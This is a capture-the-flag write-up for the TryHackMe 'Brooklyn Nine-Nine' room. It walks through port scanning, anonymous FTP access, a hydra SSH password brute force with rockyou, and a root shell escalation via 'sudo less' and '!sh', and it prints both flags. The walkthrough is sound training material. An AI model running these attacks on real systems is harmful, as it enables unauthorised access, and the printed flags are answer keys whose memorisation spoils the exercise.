---
title: "[CTF] Tryhackme - Brooklyn-nine-nine"
date: 2025-01-12 12:00:00 -500 
categories: [CTF - Tryhackme, Brooklyn-nine-nine]
tags: [ctf,exploit,flags,tryhackme,pentesting,]
author: Christoph K
---
[TryHackMe- Brooklyn-nine-nine ](https://tryhackme.com/r/room/brooklynninenine)



## Tasks 
- user flag 
- root flag




### Getting the user flag


First we start a scan via `nmap` / `rustscan`. I prefer `rustscan` because it is way faster for scanning just open port and forwards the open ports to nmap to scan services.

```bash


.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
TCP handshake? More like a friendly high-five!

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.10.195.140:21
Open 10.10.195.140:22
Open 10.10.195.140:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -A" on ip 10.10.195.140
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-18 15:05 CET
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:05
Completed NSE at 15:05, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:05
Completed NSE at 15:05, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:05
Completed NSE at 15:05, 0.00s elapsed
Initiating Ping Scan at 15:05
Scanning 10.10.195.140 [4 ports]
Completed Ping Scan at 15:05, 0.11s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 15:05
Completed Parallel DNS resolution of 1 host. at 15:05, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 15:05
Scanning 10.10.195.140 [3 ports]
Discovered open port 22/tcp on 10.10.195.140
Discovered open port 21/tcp on 10.10.195.140
Discovered open port 80/tcp on 10.10.195.140
Completed SYN Stealth Scan at 15:05, 0.08s elapsed (3 total ports)
Initiating Service scan at 15:05
Scanning 3 services on 10.10.195.140
Completed Service scan at 15:05, 6.11s elapsed (3 services on 1 host)
Initiating OS detection (try #1) against 10.10.195.140
Retrying OS detection (try #2) against 10.10.195.140
Initiating Traceroute at 15:05
Completed Traceroute at 15:05, 0.05s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 15:05
Completed Parallel DNS resolution of 2 hosts. at 15:05, 0.01s elapsed
DNS resolution of 2 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 2, DR: 0, SF: 0, TR: 2, CN: 0]
NSE: Script scanning 10.10.195.140.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:05
NSE: [ftp-bounce 10.10.195.140:21] PORT response: 500 Illegal PORT command.
Completed NSE at 15:05, 1.53s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:05
Completed NSE at 15:05, 0.32s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:05
Completed NSE at 15:05, 0.00s elapsed
Nmap scan report for 10.10.195.140
Host is up, received echo-reply ttl 63 (0.044s latency).
Scanned at 2025-01-18 15:05:35 CET for 12s

PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.11.110.106
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQjh/Ae6uYU+t7FWTpPoux5Pjv9zvlOLEMlU36hmSn4vD2pYTeHDbzv7ww75UaUzPtsC8kM1EPbMQn1BUCvTNkIxQ34zmw5FatZWNR8/De/u/9fXzHh4MFg74S3K3uQzZaY7XBaDgmU6W0KEmLtKQPcueUomeYkqpL78o5+NjrGO3HwqAH2ED1Zadm5YFEvA0STasLrs7i+qn1G9o4ZHhWi8SJXlIJ6f6O1ea/VqyRJZG1KgbxQFU+zYlIddXpub93zdyMEpwaSIP2P7UTwYR26WI2cqF5r4PQfjAMGkG1mMsOi6v7xCrq/5RlF9ZVJ9nwq349ngG/KTkHtcOJnvXz
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBItJ0sW5hVmiYQ8U3mXta5DX2zOeGJ6WTop8FCSbN1UIeV/9jhAQIiVENAW41IfiBYNj8Bm+WcSDKLaE8PipqPI=
|   256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP2hV8Nm+RfR/f2KZ0Ub/OcSrqfY1g4qwsz16zhXIpqk
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (93%), Linux 2.6.39 - 3.2 (93%), Linux 3.1 - 3.2 (93%), Linux 3.2 - 4.9 (93%), Linux 3.7 - 3.10 (93%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.94SVN%E=4%D=1/18%OT=21%CT=%CU=34105%PV=Y%DS=2%DC=T%G=N%TM=678BB53B%P=x86_64-pc-linux-gnu)
SEQ(SP=106%GCD=1%ISR=10F%TI=Z%CI=Z%II=I%TS=A)
OPS(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11)
WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)
ECN(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 4.530 days (since Tue Jan 14 02:23:11 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   48.22 ms 10.11.0.1
2   48.33 ms 10.10.195.140

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:05
Completed NSE at 15:05, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:05
Completed NSE at 15:05, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:05
Completed NSE at 15:05, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.10 seconds
           Raw packets sent: 61 (4.280KB) | Rcvd: 43 (3.180KB)



```


As we can see, we have 3 open ports:
- Port 21 (FTP)
- Port 22 (SSH)
- Port 80 (HTTP)


#### Enumerate Port 21 (FTP)

Lets check if we can see or get files as `anoynmous` user:

```bash

┌──(root㉿PREDATOR-01)-[/home/admin/Desktop/brooklyn]
└─# ftp $ip
Connected to 10.10.195.140.
220 (vsFTPd 3.0.3)
Name (10.10.195.140:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||10554|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
ftp> get note_to_jake.txt
local: note_to_jake.txt remote: note_to_jake.txt
229 Entering Extended Passive Mode (|||44444|)
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
100% |**************************************************************************************************************************************|   119       17.62 KiB/s    00:00 ETA
226 Transfer complete.
119 bytes received in 00:00 (2.34 KiB/s)
ftp> exit
221 Goodbye.

┌──(root㉿PREDATOR-01)-[/home/admin/Desktop/brooklyn]
└─# ls
note_to_jake.txt
```

As you can see, we were able to authenticate as `anonymous` user and were able to `download` the file in the directory via `get`


**Important** 
You have to check if you are able to upload things, if this is the case, you could just leave your `private key` in the `.ssh` folder and connect via ssh. 

In this case, we dont have the permission to do that.
```bash

local: note_to_jake.txt remote: note_to_jake.txt
229 Entering Extended Passive Mode (|||62512|)
550 Permission denied.
ftp>
```



The note says the following:

    From Amy,

    Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine



### Enumerate Port 80 (http)

When we open the website, we get a nice `Brooklyn nine-nine` wallpaper. When we read the source code we get the following:

```bash
└─# curl $ip
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body, html {
  height: 100%;
  margin: 0;
}

.bg {
  /* The image used */
  background-image: url("brooklyn99.jpg");

  /* Full height */
  height: 100%;

  /* Center and scale the image nicely */
  background-position: center;
  background-repeat: no-repeat;
  background-size: cover;
}
</style>
</head>
<body>

<div class="bg"></div>

<p>This example creates a full page background image. Try to resize the browser window to see how it always will cover the full screen (when scrolled to top), and that it scales nicely on all screen sizes.</p>
<!-- Have you ever heard of steganography? -->
</body>
</html>

```

I really dont like `Stenography` so we dont continue here. If you want the full puzzle you have to download the picture and try to get the hidden files out of it.



### Enumerate Port 22 (SSH) 

After reading the note from `Amy` we know that `jakes` password is potentially weak. Lets try to crack it.

I use for that `hydra`:

```bash
┌──(admin㉿PREDATOR-01)-[~]
└─$ hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.10.195.140
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-18 15:12:13
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.195.140:22/
[22][ssh] host: 10.10.195.140   login: jake   password: 987654321

```

And after a short time we get the password `987654321`... Well done `jake`.

We can connect now via `ssh`:

`ssh jake@10.10.195.140`


And we can check the user profiles for the flag:
```bash
jake@brookly_nine_nine:/home/holt$ cat user.txt
ee11cbb19052e40b07aac0ca060c23ee

```

User flag: `ee11cbb19052e40b07aac0ca060c23ee`



### Enumerate privileges


We check what we are allowed to do via `sudo -l`: 



Okay this seems very nice, we can just use `less` to get `root privileges`:

```bash
jake@brookly_nine_nine:/home/holt$ sudo /usr/bin/less /etc/hosts
```
Using `!sh` to spawn an interactive shell with root permissions. Lets grab the `root flag`:


```bash
# cd /root/
# ls
root.txt
# cat root.txt
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845

Enjoy!!
#
```


Root flag: `63a9f0ea7bb98050796b649e85481845`



## Thoughts

This is probably one of the easiest room on Tryhackme. I would really recommend this room for beginner for their first `CTF`.

What did we learn today? 
- Enumerate `FTP`
- Bruteforce via `hydra`
- Escalate our privilges via `less`
